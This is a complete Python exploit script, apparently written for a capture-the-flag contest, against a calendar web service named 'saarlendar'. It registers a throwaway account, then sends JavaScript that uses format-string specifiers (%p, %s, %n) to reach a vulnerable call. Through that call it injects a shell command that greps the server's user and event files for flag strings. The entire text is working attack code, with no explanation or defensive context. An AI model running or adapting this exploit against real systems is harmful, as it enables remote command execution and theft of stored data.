import sys
import urllib

from saarlendar import Remote, randomstring

cmd = b"grep -rohP \\'S'+'AAR.{30,}\\' users/ events/"

js = b"""for(var i=1; i<10; i++)if((fetch('\\'%'+i+'$p')+'').indexOf('0x7f')==12&&(fetch('\\'%'+i+'$s')+"").endsWith('\\''))print(fetch('\\'; """ + cmd + b""" #%100p%'+i+'$n'));"""

r = Remote(("http://%s:1337/" % (sys.argv[1])).encode())
r.DEBUG = r.VERBOSE
username, password = randomstring(10), randomstring(10)
r.register(username, password)
r.login(username, password)
for l in r.xored_message_shell(js).split(b"\n"):
    print(urllib.parse.unquote_plus(l.decode()))
